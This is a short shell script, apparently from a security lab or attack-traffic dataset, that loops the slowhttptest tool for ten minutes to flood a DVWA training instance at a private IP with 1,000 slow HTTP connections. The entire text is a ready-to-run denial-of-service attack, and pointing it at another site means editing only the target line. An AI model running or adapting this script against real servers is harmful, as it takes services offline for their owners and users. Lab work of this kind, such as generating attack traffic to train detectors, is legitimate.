#!/bin/sh
echo "[DOS] Starting..."
TARGET="http://172.20.0.10/dvwa/"
END=$(($(date +%s) + 600))

while [ $(date +%s) -lt $END ]; do
    slowhttptest -c 1000 -H \
        -o /tmp/dos_output \
        -i 10 -r 200 -t GET \
        -u $TARGET \
        -x 24 -p 3 -l 55 2>/dev/null
    sleep $((RANDOM % 5 + 3))
done
echo "[DOS] Done."